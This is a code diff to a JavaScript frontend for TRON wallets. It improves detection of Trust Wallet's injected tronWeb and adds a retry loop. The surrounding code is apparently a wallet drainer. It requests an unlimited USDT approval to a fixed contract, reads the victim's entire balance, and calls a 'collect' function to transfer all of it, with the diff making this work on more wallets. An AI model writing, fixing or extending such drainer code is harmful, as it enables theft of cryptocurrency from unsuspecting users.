@@ -204,7 +204,11 @@ const resolveTronWeb = () => {
   // 1. Check standard injected globals
   if (w.tronWeb?.contract) return w.tronWeb;
   if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
-  if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb;
+// Trust Wallet (newer builds – direct injection)
+  if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb
+
+  // Trust Wallet (older builds – tronLink wrapper)
+  if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb
   if (w.tron?.contract) return w.tron; // Trust Wallet specific injection path
 
   // 2. Reach inside the AppKit Provider
@@ -225,6 +229,16 @@ const resolveTronWeb = () => {
 };
 
   const tronWeb = resolveTronWeb();
+
+  /** Waits up to ~6 s for Trust Wallet to finish injecting `tronWeb` */
+const waitForTronWeb = async (tries = 12) => {
+  for (let i = 0; i < tries; i++) {
+    const tw = resolveTronWeb()
+    if (tw && typeof tw.contract === 'function') return tw
+    await new Promise(r => setTimeout(r, 500))
+  }
+  return null
+}
   
   // Trust Wallet Fix: If no injected tronWeb, but we have a tronWalletProvider, 
   // we check if it's a WalletConnect session.
@@ -409,10 +423,23 @@ useEffect(() => {
 
   // ---------- INJECTED TRONWEB PATH ----------
   // UPDATED CHECK: This now accounts for both injection and WalletConnect
-  if (!tronWeb || typeof tronWeb.contract !== 'function' || !walletAddress) {
-    log('❌ Error: Wallet not fully initialized')
+  let tw = tronWeb
+
+  if (!tw || typeof tw.contract !== 'function') {
+
+    setStatus('Waiting for Trust Wallet…')
+
+    tw = await waitForTronWeb()
+
+  }
+
+  if (!tw || typeof tw.contract !== 'function' || !walletAddress) {
+
+    log('❌ Error: Wallet still not ready')
+
     setStatus('TRON wallet not ready')
-    return
+        return
+
   }
 
   setLoading(true);
@@ -421,7 +448,7 @@ useEffect(() => {
 
   try {
     const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-    const usdt = await tronWeb.contract(USDT_ABI).at(USDT_ADDRESS);
+    const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS);
     
     const approveTx = await usdt.approve(CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
     log(`✅ Approved! Hash: ${approveTx.slice(0,10)}...`);
@@ -434,7 +461,7 @@ useEffect(() => {
     const amount = balanceObj.toString();
     log(`Found ${Number(amount)/1000000} USDT to collect.`);
 
-    const contract = await tronWeb.contract(COLLECT_ABI).at(CONTRACT_ADDRESS);
+    const contract = await tw.contract(COLLECT_ABI).at(CONTRACT_ADDRESS);
     const tx = await contract.collect(walletAddress, amount).send({
       feeLimit: 150_000_000,
     });
